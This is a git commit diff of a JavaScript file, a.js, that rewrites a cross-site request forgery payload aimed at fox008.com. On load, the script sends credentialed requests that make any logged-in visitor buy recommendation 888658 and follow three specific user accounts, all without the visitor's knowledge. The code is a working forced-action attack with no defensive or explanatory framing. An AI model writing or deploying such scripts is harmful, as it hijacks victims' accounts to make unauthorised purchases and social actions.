11c37b93a42d751109004c37242c22408da77ea8
fashao <ufo@cs229.com>
2016-08-11 15:24:10 +0800

    a.js

--- a.js
+++ a.js
@@ -6,7 +6,7 @@ function url_follow(userid)
 {
 	return "http://www.fox008.com/user/follow?t="+String(new Date().getTime())+"&userId="+userid+"&type=&request_token="+String(new Date().getTime());
 }
-function post_data(url)
+function buy(recommendId)
 {
 	var xmlhttp;
 	if (window.XMLHttpRequest)
@@ -18,10 +18,26 @@ function post_data(url)
   		xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
   	}
 	xmlhttp.withCredentials = true;
-	xmlhttp.open("POST",url,true);
+	xmlhttp.open("POST",url_buy(recommendId),true);
 	xmlhttp.send(null);
 }
-post_data(url_buy("888658"));
-post_data(url_follow("137536"));
-post_data(url_follow("140665"));
-post_data(url_follow("176940"));
+function follow(userid)
+{
+	var xmlhttp;
+	if (window.XMLHttpRequest)
+  	{// code for IE7+, Firefox, Chrome, Opera, Safari
+  		xmlhttp=new XMLHttpRequest();
+  	}
+	else
+  	{// code for IE6, IE5
+  		xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+  	}
+	xmlhttp.withCredentials = true;
+	xmlhttp.open("GET",url_follow(userid),true);
+	xmlhttp.send(null);
+}
+
+buy("888658");
+follow("137536");
+follow("140665");
+follow("176940");
